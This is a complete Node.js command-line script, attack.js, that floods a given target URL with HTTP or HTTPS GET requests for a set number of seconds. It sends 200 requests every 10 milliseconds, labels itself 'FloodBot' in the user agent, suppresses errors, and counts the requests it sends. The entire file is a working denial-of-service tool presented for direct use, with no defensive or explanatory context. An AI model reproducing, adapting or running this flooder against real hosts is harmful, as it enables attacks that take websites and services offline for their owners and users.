const http = require('http');
const https = require('https');
const url = require('url');

if (process.argv.length < 4) {
    console.log('Usage: node attack.js <target> <time>');
    process.exit();
}

const target = process.argv[2];
const duration = parseInt(process.argv[3]) * 1000;
const parsed = url.parse(target);
const isHttps = parsed.protocol === 'https:';
let sent = 0;
const endTime = Date.now() + duration;

function flood() {
    const options = {
        host: parsed.hostname,
        port: parsed.port || (isHttps ? 443 : 80),
        path: parsed.path || '/',
        method: 'GET',
        headers: {
            Host: parsed.hostname,
            'User-Agent': 'Mozilla/5.0 (FloodBot)',
            Connection: 'close'
        }
    };

    const req = (isHttps ? https : http).request(options);
    req.on('error', () => {}); // silent fail
    req.end();

    sent++;
    console.log(`(${sent}) Sent to ${target}`);
}

function startFlood() {
    const interval = setInterval(() => {
        if (Date.now() >= endTime) {
            clearInterval(interval);
            console.log(`Done. Total sent: ${sent}`);
            process.exit();
        }

        for (let i = 0; i < 200; i++) {
            flood();
        }
    }, 10);
}

startFlood();
